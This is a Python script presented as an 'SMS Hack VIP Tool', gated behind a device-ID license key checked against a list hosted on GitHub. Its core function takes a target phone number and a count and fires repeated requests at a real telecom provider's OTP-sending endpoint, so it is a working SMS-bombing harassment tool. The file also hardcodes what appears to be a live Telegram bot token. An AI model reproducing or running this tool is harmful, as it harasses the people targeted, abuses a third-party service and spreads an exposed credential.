#!/usr/bin/env python3
import requests, time, sys, hashlib, os, platform, subprocess, json, random

# --- CONFIGURATION ---
BOT_TOKEN = "8700243285:AAEvVldxc_YeDqZ6FItFnWhcg-18kexzFnw"
KEY_FILE = os.path.join(os.path.expanduser("~"), ".hack_vip_key.json")
ONLINE_KEY_URL = "https://raw.githubusercontent.com/hhtethtet277-svg/moeyu/refs/heads/main/key.txt"

# Colors
G, R, W, B, Y, C, M, X = "\033[1;32m", "\033[1;31m", "\033[1;37m", "\033[1;34m", "\033[1;33m", "\033[1;36m", "\033[1;35m", "\033[0m"

def clear_screen(): os.system('cls' if platform.system() == 'Windows' else 'clear')

def get_id():
    info = platform.processor() + platform.node() + platform.machine()
    return "DEV-" + hashlib.md5(info.encode()).hexdigest().upper()[:8]

def banner():
    clear_screen()
    print(f"{G}")
    print(r"  ____  __  __ ____  _  __   _   _    _    ____ _  __ ")
    print(r" / ___||  \/  / ___|| |/ /  | | | |  / \  / ___| |/ / ")
    print(r" \___ \| |\/| \___ \| ' /   | |_| | / _ \| |   | ' /  ")
    print(r"  ___) | |  | |___) | . \   |  _  |/ ___ \ |___| . \  ")
    print(r" |____/|_|  |_|____/|_|\_\  |_| |_/_/   \_\____|_|\_\ ")
    print(f"\n          {Y}>>> {W}SMS Hack VIP Tool {Y}<<<{X}")
    print(f"{W}╔══════════════════════════════════════════════════╗")
    d_id = get_id()
    print(f"  {G}•{W} Device ID : {C}{d_id}{W}")
    print(f"╚══════════════════════════════════════════════════╝{X}")
    return d_id

def check_online_keys(d_id):
    try:
        response = requests.get(ONLINE_KEY_URL, timeout=10)
        if response.status_code == 200:
            keys = [line.strip() for line in response.text.splitlines() if line.strip()]
            for key in keys:
                if key.startswith("HACK-") and d_id in key:
                    return True, key
    except: pass
    return False, None

def save_key(key):
    try:
        with open(KEY_FILE, "w") as f: json.dump({"key": key, "activated_at": time.time()}, f)
    except: pass

def get_saved_key():
    if os.path.exists(KEY_FILE):
        try:
            with open(KEY_FILE, "r") as f: return json.load(f)
        except: pass
    return None

def is_key_valid(key_data, d_id):
    if not key_data: return False
    key = key_data.get("key", "")
    activated_at = key_data.get("activated_at", 0)
    if not (key.startswith("HACK-") and d_id in key): return False
    try:
        days = int(key.split("-D")[-1])
        return time.time() < (activated_at + (days * 86400))
    except: pass
    return False

def auth(d_id):
    online_valid, key = check_online_keys(d_id)
    if online_valid:
        save_key(key)
        return True
    
    saved = get_saved_key()
    if is_key_valid(saved, d_id): return True
        
    while True:
        banner()
        print(f"{Y}[!] Online Auth Failed. Local Key Required.{X}")
        key = input(f"\n{W}[?]{G} Enter VIP Key: {W}").strip()
        if key.startswith("HACK-") and d_id in key:
            save_key(key)
            print(f"{G}[+] Key Accepted!{X}")
            time.sleep(1)
            return True
        print(f"{R}[!] Invalid Key!{X}")
        time.sleep(2)

def send_otp(p, c):
    url = "https://apis.mytel.com.mm/myid/authen/v1.0/login/method/otp/get-otp?phoneNumber={}"
    print(f"\n{W}[*] Starting SMS Hack for {C}{p}{W}...")
    for i in range(c):
        try: requests.get(url.format(p), timeout=5)
        except: pass
        print(f"[{i+1}/{c}] Sent", end="\r")
        time.sleep(0.1)
    print(f"\n{G}[+] Process Finished!{X}")
    input(f"\n{W}Press Enter to return...{X}")

def main_menu(d_id):
    while True:
        banner()
        print(f" {G}[1]{W} Start SMS Hack\n {G}[2]{W} Check Status\n {R}[0]{W} Exit")
        choice = input(f"\n{W}[?]{G} Option: {W}").strip()
        if choice == '1':
            p = input(f"{W}[?] Target Phone: {C}")
            try: send_otp(p, int(input(f"{W}[?] Count: ")))
            except: pass
        elif choice == '2':
            saved = get_saved_key()
            if is_key_valid(saved, d_id): print(f"{G}[*] Status: Active{X}")
            else: print(f"{R}[!] Status: Inactive{X}")
            input(f"\n{W}Press Enter...{X}")
        elif choice == '0': sys.exit()

if __name__ == '__main__':
    try:
        d_id = banner()
        if auth(d_id): main_menu(d_id)
    except KeyboardInterrupt: sys.exit()
